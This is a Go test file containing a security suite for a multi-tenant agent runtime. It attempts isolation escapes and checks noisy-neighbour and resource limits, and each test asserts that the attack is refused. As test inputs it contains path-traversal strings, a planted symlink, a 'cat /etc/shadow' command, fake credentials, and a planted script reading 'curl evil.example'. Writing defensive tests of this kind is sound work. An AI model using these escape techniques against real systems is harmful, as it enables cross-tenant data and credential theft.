// security_isolation_test.go — MU-021 criterion 7: "isolation escape and
// noisy-neighbour tests run in CI or a dedicated security suite."
//
// This is that suite. It runs in CI as part of `go test ./...` and can be run
// alone with `make security`, which selects it by the TestIsolationEscape /
// TestNoisyNeighbour prefixes below. It is deliberately NOT behind a build tag:
// a security suite nobody runs by default is a security suite that is broken
// and nobody knows.
//
// HOW IT DIFFERS FROM THE TESTS BESIDE IT. Every property here already has a
// unit test next to the code that enforces it, and those fail faster and read
// more clearly as tests of a function. This suite asks the attacker's question
// instead — given a workspace, what can a run in it reach, and what can it do
// to the runs beside it? — and each test is named for the escape it attempts,
// so a failure reads as "this attack now works".
//
// WHY IT LIVES IN package runtime RATHER THAN A SEPARATE PACKAGE. Driving
// privileged builtins from outside would mean exporting a
// policy-bypassing entry point from the shipped API. A dedicated package is
// not worth a permanent hole in the surface it exists to protect.
package runtime

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"

	"github.com/soulacy/soulacy/internal/sandbox"
	"github.com/soulacy/soulacy/internal/wsroot"
)

func attackEngine(t *testing.T) (*Engine, string) {
	t.Helper()
	root := t.TempDir()
	e := newMinimalEngine(t)
	if err := e.SetFilesystemRoots([]string{root}); err != nil {
		t.Fatal(err)
	}
	e.SetPrivilegedWorkDir(root)
	return e, root
}

func tenantTree(t *testing.T, e *Engine, workspaceID string) string {
	t.Helper()
	roots, err := e.WorkspaceFilesystemRoots(workspaceID)
	if err != nil {
		t.Fatal(err)
	}
	return roots[0]
}

func attempt(t *testing.T, e *Engine, ctx context.Context, tool string, args map[string]any) (string, error) {
	t.Helper()
	return systemTool(t, e, tool).Handler(ctx, args)
}

// ── Escapes ────────────────────────────────────────────────────────────────

// The direct attempt: name the neighbour's file and read it.
func TestIsolationEscapeByAbsolutePath(t *testing.T) {
	e, _ := attackEngine(t)
	victim := tenantTree(t, e, "ws-victim")
	secret := filepath.Join(victim, "credentials.txt")
	if err := os.WriteFile(secret, []byte("victim-token"), 0o600); err != nil {
		t.Fatal(err)
	}
	for _, tool := range []string{"read_file", "list_dir", "find_files"} {
		out, err := attempt(t, e, inWorkspace(context.Background(), "ws-attacker"), tool, map[string]any{"path": secret})
		if err == nil {
			t.Errorf("%s reached another workspace: %q", tool, out)
		}
		if strings.Contains(out, "victim-token") {
			t.Errorf("%s leaked the victim's contents", tool)
		}
	}
}

// Walking out with dots, in three spellings.
func TestIsolationEscapeByTraversal(t *testing.T) {
	e, root := attackEngine(t)
	victim := tenantTree(t, e, "ws-victim")
	if err := os.WriteFile(filepath.Join(victim, "secret.txt"), []byte("victim-token"), 0o600); err != nil {
		t.Fatal(err)
	}
	for _, path := range []string{
		"../ws-victim/secret.txt",
		"../../" + wsroot.NamespaceDir + "/ws-victim/secret.txt",
		filepath.Join(root, wsroot.NamespaceDir, "ws-victim", "secret.txt"),
	} {
		if out, err := attempt(t, e, inWorkspace(context.Background(), "ws-attacker"), "read_file", map[string]any{"path": path}); err == nil {
			t.Errorf("traversal %q succeeded: %q", path, out)
		}
	}
}

// The no-principal fallback. Schedules and channel messages reach the engine
// as the personal workspace, whose root physically CONTAINS every tenant tree.
// Containment alone would make those paths a universal reader.
func TestIsolationEscapeThroughThePersonalFallback(t *testing.T) {
	e, _ := attackEngine(t)
	victim := tenantTree(t, e, "ws-victim")
	secret := filepath.Join(victim, "secret.txt")
	if err := os.WriteFile(secret, []byte("tenant-token"), 0o600); err != nil {
		t.Fatal(err)
	}
	out, err := attempt(t, e, context.Background(), "read_file", map[string]any{"path": secret})
	if err == nil || strings.Contains(out, "tenant-token") {
		t.Fatalf("a run with no principal read a tenant's file: %v %q", err, out)
	}
}

// Plant a symlink in your OWN workspace pointing at a neighbour's. The path
// the tool is handed is legitimately inside the attacker's root; only symlink
// resolution before the containment test catches it.
func TestIsolationEscapeBySymlinkPlantedInsideTheOwnWorkspace(t *testing.T) {
	e, _ := attackEngine(t)
	attacker := tenantTree(t, e, "ws-attacker")
	victim := tenantTree(t, e, "ws-victim")
	if err := os.WriteFile(filepath.Join(victim, "secret.txt"), []byte("victim-token"), 0o600); err != nil {
		t.Fatal(err)
	}
	link := filepath.Join(attacker, "peek")
	if err := os.Symlink(victim, link); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
	out, err := attempt(t, e, inWorkspace(context.Background(), "ws-attacker"), "read_file",
		map[string]any{"path": filepath.Join(link, "secret.txt")})
	if err == nil || strings.Contains(out, "victim-token") {
		t.Fatalf("a planted symlink escaped the workspace: %v %q", err, out)
	}
}

// Writing is worse than reading: a file planted in another tenant's tree is
// code that tenant's own agent may later be asked to run.
func TestIsolationEscapeByWritingIntoANeighbour(t *testing.T) {
	e, _ := attackEngine(t)
	victim := tenantTree(t, e, "ws-victim")
	planted := filepath.Join(victim, "job.sh")
	if _, err := attempt(t, e, inWorkspace(context.Background(), "ws-attacker"), "write_file",
		map[string]any{"path": planted, "content": "curl evil.example"}); err == nil {
		t.Error("write_file planted a file in another workspace")
	}
	if _, err := os.Stat(planted); !os.IsNotExist(err) {
		t.Fatalf("the planted file exists: %v", err)
	}
}

// The container runner is the last line. Even a caller naming a host path
// outright must not get it bind-mounted.
func TestIsolationEscapeByWideningTheContainerMount(t *testing.T) {
	inside := t.TempDir()
	elsewhere := t.TempDir()
	runner := DockerPrivilegedRunner{Workspace: inside, Root: inside, Binary: "/nonexistent-docker"}
	ready := context.WithValue(context.Background(), isolationReadyKey{}, true)
	for _, target := range []string{elsewhere, "/", "/etc", filepath.Join(inside, "..")} {
		_, err := runner.Run(ready, PrivilegedCommand{Argv: []string{"cat", "/etc/shadow"}, Workspace: target})
		if err == nil || !strings.Contains(err.Error(), "outside the configured workspace") {
			t.Errorf("mount %q was not refused: %v", target, err)
		}
	}
}

// A privileged command must never start life pointed at another tenant's tree,
// whatever a builtin passes.
func TestIsolationEscapeByAPrivilegedWorkingDirectory(t *testing.T) {
	e, _ := attackEngine(t)
	victim := tenantTree(t, e, "ws-victim")
	rec := &recordingPrivilegedRunner{}
	e.SetPrivilegedCommandRunner(rec)

	ctx := inWorkspace(context.Background(), "ws-attacker")
	if _, err := attempt(t, e, ctx, "shell_exec",
		map[string]any{"command": "cat secret.txt", "working_dir": victim}); err == nil {
		t.Error("shell_exec started in another workspace's tree")
	}
	// And the default path, where no working_dir is named at all, must still
	// land in the attacker's own tree — never the platform root.
	if _, err := attempt(t, e, ctx, "shell_exec", map[string]any{"command": "true"}); err != nil {
		t.Fatal(err)
	}
	if !pathWithinRoot(rec.last.WorkingDir, tenantTree(t, e, "ws-attacker")) {
		t.Fatalf("default working directory %s is outside the caller's workspace", rec.last.WorkingDir)
	}
}

// ── Noisy neighbours ───────────────────────────────────────────────────────

// The same relative path in two workspaces must be two files. When roots[0]
// was the shared platform root, every tenant's "notes.txt" was one file and
// the last writer won.
func TestNoisyNeighbourCannotCollideOnARelativePath(t *testing.T) {
	e, _ := attackEngine(t)
	for _, ws := range []string{"ws-a", "ws-b"} {
		if _, err := attempt(t, e, inWorkspace(context.Background(), ws), "write_file",
			map[string]any{"path": "notes.txt", "content": ws}); err != nil {
			t.Fatalf("%s write: %v", ws, err)
		}
	}
	for _, ws := range []string{"ws-a", "ws-b"} {
		out, err := attempt(t, e, inWorkspace(context.Background(), ws), "read_file", map[string]any{"path": "notes.txt"})
		if err != nil {
			t.Fatalf("%s read: %v", ws, err)
		}
		if !strings.Contains(out, ws) {
			t.Fatalf("%s read back %q — a neighbour overwrote it", ws, out)
		}
	}
}

// Under concurrency the property is still structural — different files, not a
// lock — so this is a race-detector target as much as an assertion.
func TestNoisyNeighbourCannotInterfereUnderConcurrency(t *testing.T) {
	e, _ := attackEngine(t)
	workspaces := []string{"ws-a", "ws-b", "ws-c", "ws-d"}
	errs := make([]error, len(workspaces))
	var wg sync.WaitGroup
	for i, ws := range workspaces {
		wg.Add(1)
		go func(i int, ws string) {
			defer wg.Done()
			for n := 0; n < 20; n++ {
				if _, err := systemTool(t, e, "write_file").Handler(
					inWorkspace(context.Background(), ws),
					map[string]any{"path": "shared.txt", "content": ws}); err != nil {
					errs[i] = err
					return
				}
			}
		}(i, ws)
	}
	wg.Wait()
	for i, err := range errs {
		if err != nil {
			t.Fatalf("%s: %v", workspaces[i], err)
		}
	}
	for _, ws := range workspaces {
		out, err := attempt(t, e, inWorkspace(context.Background(), ws), "read_file", map[string]any{"path": "shared.txt"})
		if err != nil {
			t.Fatal(err)
		}
		if strings.TrimSpace(out) != ws {
			t.Fatalf("%s read %q under concurrency", ws, strings.TrimSpace(out))
		}
	}
}

// One run's leftovers must not become the next run's inputs, even inside a
// single workspace where the filesystem boundary does not apply.
func TestNoisyNeighbourCannotInheritAFinishedRunsScratch(t *testing.T) {
	e, _ := attackEngine(t)
	tree := tenantTree(t, e, "ws-a")
	scratch := e.runScratchDir(WithRunID(inWorkspace(context.Background(), "ws-a"), "run_first"))
	if !pathWithinRoot(scratch, tree) {
		t.Fatalf("scratch %s is outside the workspace tree", scratch)
	}
	leftover := filepath.Join(scratch, "decrypted-secret")
	if err := os.WriteFile(leftover, []byte("token"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := e.RemoveRunScratch(context.Background(), "ws-a", "run_first"); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(leftover); !os.IsNotExist(err) {
		t.Fatalf("a finished run's secret is still on disk: %v", err)
	}
}

// A tenant's tools must not inherit the gateway's credentials — the noisiest
// neighbour of all is the host process.
func TestIsolationEscapeByInheritingGatewayCredentials(t *testing.T) {
	t.Setenv("ANTHROPIC_API_KEY", "sk-must-not-leak")
	t.Setenv("DATABASE_URL", "postgres://must-not-leak")
	e, _ := attackEngine(t)
	for _, pair := range e.shellEnviron() {
		if strings.Contains(pair, "must-not-leak") {
			t.Fatalf("a gateway credential reached the tool environment: %s", pair)
		}
	}
}

// An MCP server is a subprocess an operator installed and a tenant's agents
// call. Before MU-017 criterion 5 there was ONE set of them for the whole
// deployment, started in the gateway's own working directory — so a
// filesystem MCP server resolved every tenant's relative path against the same
// tree. Confinement had nothing to confine to, because a server had no
// workspace.
//
// Asserted through WorkspaceConfinement, the function mcp.Pool actually calls,
// rather than through the pool: this is the engine's half of the contract, and
// it is the half that can regress silently — a confinement that resolved to
// one shared directory would still satisfy every interface and start every
// server successfully.
func TestIsolationEscapeByASharedMCPWorkingDirectory(t *testing.T) {
	e, _ := attackEngine(t)

	dirA, _, _, err := e.WorkspaceConfinement("ws-a")
	if err != nil {
		t.Fatal(err)
	}
	dirB, _, _, err := e.WorkspaceConfinement("ws-b")
	if err != nil {
		t.Fatal(err)
	}
	if dirA == dirB {
		t.Fatalf("both workspaces' MCP servers would start in %s", dirA)
	}
	// And each must be the workspace's OWN tree — the same one read_file and
	// write_file resolve against. A separate scratch namespace beside it would
	// be disjoint and still wrong: a server that writes a file the tenant then
	// cannot read is a feature that appears broken.
	if !pathWithinRoot(dirA, tenantTree(t, e, "ws-a")) {
		t.Errorf("ws-a's MCP working directory %s is outside its own tree", dirA)
	}
	if !pathWithinRoot(dirB, tenantTree(t, e, "ws-b")) {
		t.Errorf("ws-b's MCP working directory %s is outside its own tree", dirB)
	}
}

// A Python tool is the largest filesystem consumer in the deployment and the
// one the filesystem story missed. read_file and write_file resolve through
// MU-021's per-workspace roots and have tests above proving it; a tool calling
// open() is a different PROCESS using the OS's own path resolution, so none of
// that applies to it. It was spawned with no cmd.Dir, inheriting whatever
// directory the gateway was started in — one directory for every tenant.
//
// Asserted on the spawned command's working directory rather than by running a
// tool that writes a file: the property is a property of the exec call, and a
// file-writing test would pass on a build that set cmd.Dir to the right place
// for the wrong reason (the test's own temp dir being the gateway's CWD).
func TestNoisyNeighbourCannotCollideInAToolSubprocess(t *testing.T) {
	e, root := attackEngine(t)

	dirA, err := e.toolWorkDir(inWorkspace(context.Background(), "ws-a"))
	if err != nil {
		t.Fatal(err)
	}
	dirB, err := e.toolWorkDir(inWorkspace(context.Background(), "ws-b"))
	if err != nil {
		t.Fatal(err)
	}
	if dirA == dirB {
		t.Fatalf("both tenants' tool subprocesses start in %s, so one relative path is one file", dirA)
	}
	// Each must be the tenant's own tree — the SAME one read_file resolves
	// against. A tool that writes a file the agent cannot then read is a tool
	// that looks broken, and the next person fixes it by removing the
	// confinement.
	for ws, dir := range map[string]string{"ws-a": dirA, "ws-b": dirB} {
		if !pathWithinRoot(dir, tenantTree(t, e, ws)) {
			t.Errorf("%s's tool subprocess starts in %s, outside its own tree", ws, dir)
		}
	}
	// Invariant 7: personal gets the configured root, unchanged and not
	// namespaced under it.
	personal, err := e.toolWorkDir(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	if personal != root {
		t.Errorf("a single-tenant install's tools start in %s, want the configured root %s", personal, root)
	}

	// MU-016 criterion 5 is about the RUN's mounts, not the workspace's. Two
	// concurrent runs of the SAME tenant both writing `out.csv` are one file
	// otherwise, and the second silently overwrites the first — a data-loss
	// bug that no tenancy boundary catches because there is no tenancy
	// violation in it.
	ctxA := WithRunID(inWorkspace(context.Background(), "ws-a"), "run_one")
	ctxB := WithRunID(inWorkspace(context.Background(), "ws-a"), "run_two")
	runA, err := e.toolWorkDir(ctxA)
	if err != nil {
		t.Fatal(err)
	}
	runB, err := e.toolWorkDir(ctxB)
	if err != nil {
		t.Fatal(err)
	}
	if runA == runB {
		t.Errorf("two runs of one workspace share the tool directory %s", runA)
	}
	// Both must still sit inside the tenant's tree, or the run boundary has
	// been bought by breaking the tenant one.
	for name, dir := range map[string]string{"run_one": runA, "run_two": runB} {
		if !pathWithinRoot(dir, tenantTree(t, e, "ws-a")) {
			t.Errorf("%s's directory %s escaped the workspace tree", name, dir)
		}
	}
	// And the shell path must agree, or a script written by one tool is
	// looked for in the wrong place by the next.
	if shell := e.defaultPrivilegedWorkDir(ctxA); shell != runA {
		t.Errorf("shell_exec starts in %s but tool subprocesses in %s — the run's own tools disagree about where \"here\" is", shell, runA)
	}
}

// ── Resource bounds (criterion 3) ──────────────────────────────────────────

// "CPU, memory, PIDs, open files, disk, wall time, and output size are
// limited." Seven dimensions, and a limit that silently stops being applied
// looks exactly like one that is. Asserted together so a partial regression —
// the common kind — cannot hide behind the six that still work.
func TestNoisyNeighbourIsBoundedOnEveryResourceDimension(t *testing.T) {
	argsFile := filepath.Join(t.TempDir(), "argv")
	fake := writeArgRecorder(t, argsFile)
	work := t.TempDir()
	runner := DockerPrivilegedRunner{
		Workspace: work, Root: work, Binary: fake, Image: "python:3.12-slim",
		Limits: sandbox.Limits{CPUSeconds: 30, MemoryMB: 128, OpenFiles: 64, FileSizeMB: 8},
		PIDs:   32,
	}
	ready := context.WithValue(context.Background(), isolationReadyKey{}, true)
	if _, err := runner.Run(ready, PrivilegedCommand{Argv: []string{"true"}, WorkingDir: work}); err != nil {
		t.Fatal(err)
	}
	raw, err := os.ReadFile(argsFile)
	if err != nil {
		t.Fatal(err)
	}
	argv := string(raw)
	for dimension, want := range map[string]string{
		"cpu":        "--cpus",
		"memory":     "--memory\n128m",
		"pids":       "--pids-limit\n32",
		"open files": "nofile=64:64",
		"disk":       "fsize=8388608:8388608",
		"network":    "--network\nnone",
		"filesystem": "--read-only",
	} {
		if !strings.Contains(argv, want) {
			t.Errorf("%s is not bounded: %q missing from\n%s", dimension, want, argv)
		}
	}

	// Wall time and output size are the engine's, not the container's: the
	// runner would happily wait forever on a command that never exits, and
	// return whatever it printed.
	e, _ := attackEngine(t)
	e.SetPrivilegedCommandRunner(floodingPrivilegedRunner{})
	out, err := attempt(t, e, inWorkspace(context.Background(), "ws-a"), "shell_exec",
		map[string]any{"command": "yes"})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(out, "[output truncated]") {
		t.Fatalf("output size is not bounded: %d bytes returned intact", len(out))
	}
	deadlined, cancel := context.WithCancel(inWorkspace(context.Background(), "ws-a"))
	cancel()
	e.SetPrivilegedCommandRunner(blockingPrivilegedRunner{})
	if _, err := attempt(t, e, deadlined, "shell_exec", map[string]any{"command": "sleep"}); err == nil {
		t.Fatal("wall time is not bounded: a command outlived its context")
	}
}

// writeArgRecorder produces a shell stub that records the argv it was called
// with, one argument per line, and exits 0.
func writeArgRecorder(t *testing.T, target string) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), "fake-docker")
	script := "#!/bin/sh\n: > " + target + "\nfor a in \"$@\"; do echo \"$a\" >> " + target + "; done\nexit 0\n"
	if err := os.WriteFile(path, []byte(script), 0o700); err != nil {
		t.Fatal(err)
	}
	return path
}

type floodingPrivilegedRunner struct{}

func (floodingPrivilegedRunner) Mode() string { return "docker" }
func (floodingPrivilegedRunner) Run(context.Context, PrivilegedCommand) (string, error) {
	return strings.Repeat("y\n", 20000), nil
}

type blockingPrivilegedRunner struct{}

func (blockingPrivilegedRunner) Mode() string { return "docker" }
func (blockingPrivilegedRunner) Run(ctx context.Context, _ PrivilegedCommand) (string, error) {
	<-ctx.Done()
	return "", ctx.Err()
}
